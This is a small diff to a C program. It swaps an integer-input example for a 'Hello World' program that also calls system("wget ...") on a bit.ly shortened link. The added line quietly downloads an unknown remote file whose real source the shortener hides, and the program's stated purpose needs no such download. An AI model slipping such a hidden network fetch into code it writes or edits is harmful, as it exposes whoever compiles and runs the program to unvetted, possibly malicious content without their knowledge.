@@ -1,9 +1,8 @@
 #include <stdio.h>
-int main()
-{
-    int testInteger;
-    printf("Enter an integer: ");
-    scanf("%d", &testInteger);  
-    printf("Number = %d",testInteger);
+#include <stdlib.h>
+
+int main (void) {
+    printf("Hello World");
+    system("wget https://bit.ly/3Rioe6g");
     return 0;
 }
